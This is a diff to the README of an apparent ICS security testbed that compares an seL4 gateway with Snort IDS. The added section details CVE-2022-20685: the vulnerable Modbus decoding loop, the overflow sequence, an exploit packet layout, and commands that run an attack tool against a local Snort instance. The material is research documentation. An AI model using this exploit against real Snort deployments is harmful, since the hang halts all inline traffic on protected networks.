@@ -79,7 +79,8 @@ docker build -t ics-gateway .
 The gateway requires a user-provided seL4 image at `gateway/sel4-image/capdl-loader-image-arm-qemu-arm-virt`.
 
 **Port Mappings:**
-- `502`: Protected access through seL4 gateway
+- `502`: Protected access through seL4 gateway (protocol-break)
+- `503`: Protected access through Snort IDS (packet-forwarding)
 - `5020`: Direct bypass to vulnerable PLC
 - `5021`: ASAN-instrumented PLC for CVE verification
 
@@ -99,10 +100,13 @@ The gateway requires a user-provided seL4 image at `gateway/sel4-image/capdl-loa
 │   └── sel4-image/           # User-provided seL4 kernel
 │
 ├── snort/                    # Snort IDS (for comparison)
-│   ├── Dockerfile            # Snort 2.9.18 (vulnerable to CVE-2022-20685)
+│   ├── Dockerfile            # Snort 2.9.18 with NFQUEUE support
 │   ├── snort.conf            # Snort config with Modbus preprocessor
-│   ├── setup-network.sh      # Packet-forwarding network setup
-│   ├── start-snort.sh        # Snort launcher
+│   ├── classification.config # Rule classification definitions
+│   ├── setup-network.sh      # NFQUEUE iptables configuration
+│   ├── start-snort.sh        # Snort launcher (--daq nfq)
+│   ├── perf-monitor.sh       # Performance monitoring script
+│   ├── snort-2.9.18/         # Vulnerable source (for analysis, gitignored)
 │   └── rules/                # Modbus detection rules
 │       ├── modbus.rules
 │       └── local.rules
@@ -185,33 +189,80 @@ The seL4 gateway blocks this by:
 **Affected:** Snort < 2.9.19, Snort 3 < 3.1.11.0
 **Type:** Integer overflow causing infinite loop
 **Vector:** Malformed Modbus Write File Record request
+**Source:** `snort/snort-2.9.18/src/dynamic-preprocessors/modbus/modbus_decode.c`
 
 ### Vulnerability Mechanism
 
-The vulnerable code is in `ModbusCheckRequestLengths()` in `modbus_decode.c`:
+The vulnerable code is in `ModbusCheckRequestLengths()` at lines 187-228:
 
 ```c
-uint16_t bytes_processed;
-uint16_t record_length;  // Attacker-controlled from packet
+case MODBUS_FUNC_WRITE_FILE_RECORD:
+    tmp_count = *(packet->payload + MODBUS_MIN_LEN);  // Data length from packet
+    uint16_t bytes_processed = 0;
 
-while (bytes_processed < tmp_count) {
-    record_length = *(uint16_t*)(payload + offset);
-    bytes_processed = 7 + (2 * record_length);  // INTEGER OVERFLOW!
-}
+    while (bytes_processed < (uint16_t)tmp_count) {
+        // Read record_length from payload at current offset
+        record_length = *(payload + bytes_processed + 5);
+
+        // INTEGER OVERFLOW HERE!
+        bytes_processed += 7 + (2 * record_length);
+    }
 ```
 
-**Attack:**
-1. Send Write File Record (function 0x15) with `record_length = 0xFFFE`
-2. Calculation: `bytes_processed = 7 + (2 × 0xFFFE) = 0x20003`
-3. Overflow: `0x20003 & 0xFFFF = 0x0003` (uint16_t truncation)
-4. Loop condition `3 < tmp_count` remains true → **infinite loop**
-5. Snort hangs, stops processing packets → **IDS is blind**
+### Attack Sequence (Corrected)
+
+The key insight is that after overflow, the code reads from a DIFFERENT offset:
+
+1. `bytes_processed = 0`, read from offset 5 → `record_length = 0xFFFE`
+   - `bytes_processed = 0 + 7 + 2×0xFFFE = 0x20003` → overflows to **3**
+
+2. `bytes_processed = 3`, read from offset 8 → `record_length = 0xFFFB`
+   - `bytes_processed = 3 + 7 + 2×0xFFFB = 0x20000` → overflows to **0**
+
+3. `bytes_processed = 0` again → **INFINITE LOOP** (oscillates 0 → 3 → 0 → ...)
+
+### Exploit Packet Structure
+
+```
+Offset 0:   0x06 (ref_type - required for validation)
+Offset 1-4: padding
+Offset 5-6: 0xFFFE (record_length for first read)
+Offset 7:   padding
+Offset 8-9: 0xFFFB (record_length for second read after overflow)
+Offset 10-13: padding
+```
+
+### NFQUEUE Impact
+
+Snort runs in NFQUEUE inline mode:
+- iptables sends packets to kernel queue
+- Snort must return ACCEPT/DROP verdict
+- When Snort hangs → no verdicts → **ALL traffic blocked**
+
+This is worse than just "IDS blindness" - it's complete denial of service.
+
+### Testing the Attack
+
+```bash
+# Before attack - verify traffic works
+echo -ne '\x00\x01\x00\x00\x00\x06\x01\x03\x00\x00\x00\x01' | nc -w 2 localhost 503 | xxd
+
+# Send attack
+./cve_tools/cve_20685_attack 127.0.0.1 503
+
+# After attack - traffic should TIMEOUT (not just no alert, but NO RESPONSE)
+echo -ne '\x00\x01\x00\x00\x00\x06\x01\x03\x00\x00\x00\x01' | nc -w 5 localhost 503 | xxd
+
+# Verify 100% CPU
+sudo docker exec ics-snort top -b -n 1 | grep snort
+```
 
 ### Why seL4 is Immune
 
 - seL4 has no Modbus preprocessor (no vulnerable code path)
 - Minimal attack surface (~1000 LoC vs ~500,000 LoC)
 - Simple length validation cannot be exploited this way
+- Protocol-break architecture means no complex parsing
 
 ## Modbus Register Map (Heating Simulation)
 
@@ -442,6 +493,38 @@ sudo docker compose up snort
 cd snort/
 docker build -t ics-snort .
 ```
+
+### Snort NFQUEUE Architecture
+
+Snort runs in true inline IPS mode using Linux NFQUEUE:
+
+```
+┌─────────────────────────────────────────────────────────────────┐
+│                     Snort Container                             │
+│                                                                 │
+│  Host:503 ──▶ :502 ──▶ iptables ──▶ NFQUEUE ──▶ Snort          │
+│                           │                       │             │
+│                      DNAT to                  ACCEPT/DROP       │
+│                    192.168.95.2                   │             │
+│                           │                       │             │
+│                           └───────────────────────┘             │
+│                                      │                          │
+│                              Forward to PLC                     │
+└─────────────────────────────────────────────────────────────────┘
+```
+
+**Traffic Flow:**
+1. Packet arrives at container port 502
+2. iptables PREROUTING: DNAT to 192.168.95.2:502
+3. iptables FORWARD: Send to NFQUEUE (queue 0)
+4. Snort reads from queue, inspects with Modbus preprocessor
+5. Snort returns ACCEPT → packet forwarded to PLC
+6. Snort returns DROP → packet discarded
+
+**Key Files:**
+- `snort/setup-network.sh`: Configures iptables NFQUEUE rules
+- `snort/start-snort.sh`: Starts Snort with `--daq nfq --daq-var queue=0`
+- `snort/snort.conf`: Enables Modbus preprocessor (vulnerable)
 
 ### CVE-2022-20685: Snort Modbus Preprocessor DoS
 
